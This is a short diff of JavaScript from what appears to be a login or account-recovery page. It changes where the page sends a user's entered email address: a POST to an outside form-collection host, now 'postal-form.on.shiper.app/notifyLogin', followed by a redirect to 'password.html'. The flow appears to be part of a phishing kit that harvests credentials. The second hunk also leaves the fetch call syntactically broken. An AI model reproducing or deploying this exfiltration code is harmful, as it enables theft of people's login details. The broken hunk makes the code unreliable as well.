@@ -460,7 +460,7 @@
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/rAR0ZUTqb", {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -476,9 +476,7 @@
                          window.location.href = "password.html"
                     }
                     
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ email: recoveryInput, password: "." })
+              
                         }).then(res=>{
                             if(res.ok){
                                 window.location.href = "password.html"
